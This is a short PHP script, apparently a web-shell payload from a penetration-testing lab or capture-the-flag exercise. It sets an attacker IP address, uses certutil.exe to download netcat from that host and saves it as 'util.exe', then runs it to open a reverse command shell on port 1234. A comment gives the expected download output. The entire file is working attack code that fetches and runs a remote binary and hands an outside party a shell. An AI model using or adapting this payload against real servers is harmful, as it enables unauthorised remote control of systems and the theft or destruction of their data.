<?php

$atk_IP = "10.9.2.142";

system("certutil.exe -urlcache -f http://" .$atk_IP. ":8000/nc.exe util.exe");
//should get: download...**** Online **** CertUtil: -URLCache command completed successfully. 

 if(file_exists("./util.exe")){
	//echo "<br>util exists";
	system("util.exe ".$atk_IP." 1234 -e cmd");
 }

else {
	echo "I was not able to download util file";
}

?>
